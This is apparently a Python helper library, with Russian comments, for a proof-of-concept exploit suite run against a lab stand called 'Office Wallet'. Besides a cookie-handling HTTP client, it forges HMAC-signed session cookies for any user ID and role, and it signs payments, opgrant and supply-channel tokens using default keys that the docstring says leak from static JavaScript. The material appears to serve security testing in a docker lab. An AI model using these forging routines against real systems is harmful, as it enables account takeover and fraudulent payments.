# -*- coding: utf-8 -*-
"""HTTP-клиент для PoC по стенду Office Wallet.

Приложение работает на cookie-сессиях (ow_session) и form-POST, а не на Token-API,
поэтому прошлый KeptExpliots/_http.py не подходит. Здесь:

  * cookie jar и form-POST;
  * форджер сессии (ow.<uid>.<role>.<hmac>) с известным SESSION_KEY;
  * подпись платежа (PaymentKey), opgrant и supply-channel.

Ключи по умолчанию совпадают с docker-compose.yml и утекают из статики
(/static/pay.js, /static/wallet.js, /static/legacy-sync.js), поэтому подделка
доступна любому анонимному клиенту.

Запуск обычно из контейнера в сети стенда:
  docker run --rm --network work_default -v <poc>:/poc python:3-alpine \
      python /poc/run_all.py --base http://app:8080
"""
import argparse
import hashlib
import hmac
import json
import os
import re
import urllib.error
import urllib.parse
import urllib.request

DEFAULT_BASE = os.environ.get("STAND_URL", "http://app:8080")
SESSION_KEY = os.environ.get("SESSION_KEY", "office-wallet-session-key")
PAYMENT_KEY = os.environ.get("PAYMENT_KEY", "office-wallet-pay-key")


def parser(description: str) -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description=description)
    p.add_argument("--base", default=DEFAULT_BASE)
    return p


def _hmac_hex(key: str, msg: str) -> str:
    return hmac.new(key.encode(), msg.encode(), hashlib.sha256).hexdigest()


def sign_session(uid: int, role: str, key: str = SESSION_KEY) -> str:
    return _hmac_hex(key, f"{uid}:{role}")


def forge_session_cookie(uid: int, role: str, key: str = SESSION_KEY) -> str:
    return f"ow.{uid}.{role}.{sign_session(uid, role, key)}"


def sign_payment(op_id: int, amount: int, recipient: str, key: str = PAYMENT_KEY) -> str:
    return _hmac_hex(key, f"{op_id}:{amount}:{recipient}")


def sign_opgrant(viewer_id: int, op_id: int, key: str = SESSION_KEY) -> str:
    return _hmac_hex(key, f"opgrant:{viewer_id}:{op_id}")[:32]


def supply_channel(key: str = SESSION_KEY) -> str:
    return _hmac_hex(key, "supply-channel-v2")[:20]


class Client:
    def __init__(self, base: str = DEFAULT_BASE):
        self.base = base.rstrip("/")
        self.cookies = {}
        self.opener = urllib.request.build_opener(
            NoRedirect(), urllib.request.ProxyHandler({})
        )

    def _capture(self, headers):
        for raw in headers.get_all("Set-Cookie") or []:
            m = re.match(r"\s*([^=;]+)=([^;]*)", raw)
            if not m:
                continue
            name, value = m.group(1).strip(), m.group(2).strip()
            if value == "" or "max-age=-1" in raw.lower():
                self.cookies.pop(name, None)
            else:
                self.cookies[name] = value

    def _cookie_header(self):
        return "; ".join(f"{k}={v}" for k, v in self.cookies.items())

    def _request(self, method, path, data=None, headers=None, timeout=20):
        url = self.base + path
        hdrs = {"User-Agent": "ow-poc"}
        if self.cookies:
            hdrs["Cookie"] = self._cookie_header()
        if headers:
            hdrs.update(headers)
        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        try:
            resp = self.opener.open(req, timeout=timeout)
            status, hobj, body = resp.status, resp.headers, resp.read()
        except urllib.error.HTTPError as e:
            status, hobj, body = e.code, e.headers, e.read()
        self._capture(hobj)
        return status, dict(hobj), body

    def get(self, path, headers=None, timeout=20):
        return self._request("GET", path, headers=headers, timeout=timeout)

    def post_form(self, path, fields, headers=None, timeout=20):
        data = urllib.parse.urlencode(fields).encode()
        hdrs = {"Content-Type": "application/x-www-form-urlencoded"}
        if headers:
            hdrs.update(headers)
        return self._request("POST", path, data=data, headers=hdrs, timeout=timeout)

    # --- auth helpers ---
    def set_cookie(self, name, value):
        self.cookies[name] = value

    def login(self, login, password):
        return self.post_form("/login", {"login": login, "password": password, "return": "/"})

    def register(self, login, password, name=None, email=None):
        name = name or login
        email = email or (login + "@poc.local")
        return self.post_form("/register", {
            "login": login, "password": password, "display_name": name, "email": email,
        })

    def forge(self, uid, role, key: str = SESSION_KEY):
        """Выписать себе сессию с произвольными uid/role без знания пароля."""
        self.cookies["ow_session"] = forge_session_cookie(uid, role, key)


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def banner(text: str):
    print(f"[*] {text}", flush=True)


def ok(text: str):
    print(f"[OK] {text}", flush=True)


def fail(text: str):
    raise SystemExit(f"[FAIL] {text}")
